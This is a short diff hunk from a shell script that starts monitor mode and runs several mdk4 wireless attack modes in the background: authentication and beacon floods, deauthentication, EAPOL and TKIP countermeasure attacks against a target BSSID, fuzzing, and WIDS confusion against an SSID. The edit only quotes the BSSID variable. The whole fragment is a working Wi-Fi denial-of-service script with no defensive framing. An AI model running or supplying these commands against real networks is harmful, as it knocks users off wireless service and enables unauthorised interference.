@@ -11,9 +11,9 @@ sudo airmon-ng start "$IFACE" 1
 sudo mdk4 "$MON" a &
 sudo mdk4 "$MON" b &
 sudo mdk4 "$MON" d &
-sudo mdk4 "$MON" e -t $BSSID &
+sudo mdk4 "$MON" e -t "$BSSID" &
 sudo mdk4 "$MON" f -s a -m s -p 1000 &
-sudo mdk4 "$MON" m -t $BSSID &
+sudo mdk4 "$MON" m -t "$BSSID" &
 sudo mdk4 "$MON" w -e "$SSID" &
 
 sleep $TIMEOUT
